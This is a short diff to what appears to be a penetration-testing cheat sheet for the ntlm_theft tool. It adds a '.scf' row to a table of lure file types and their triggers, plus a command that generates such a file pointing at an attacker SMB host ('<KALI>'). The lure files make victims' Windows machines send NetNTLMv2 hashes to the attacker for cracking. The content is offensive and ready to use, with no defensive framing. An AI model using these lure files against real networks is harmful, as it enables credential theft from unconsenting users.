@@ -5,12 +5,14 @@ Induces client authentication to your SMB listener. Captured NetNTLMv2 is crack-
 | File | Trigger |
 | --- | --- |
 | `.url` | Target browses the folder |
+| `.scf` | Target browses the folder (ICONFILE trick; broken on current Windows builds) |
 | `.docx` / `.xlsx` | Target opens it |
 | `.Library-ms` / `.lnk` | Target opens or browses it |
 
 ## Generate
 ```bash
 python3 ntlm_theft.py -g url  -s <KALI> -f folder-probe
+python3 ntlm_theft.py -g scf  -s <KALI> -f folder-probe
 python3 ntlm_theft.py -g docx -s <KALI> -f document-probe
 python3 ntlm_theft.py -g all  -s <KALI> -f format-survey
 ```
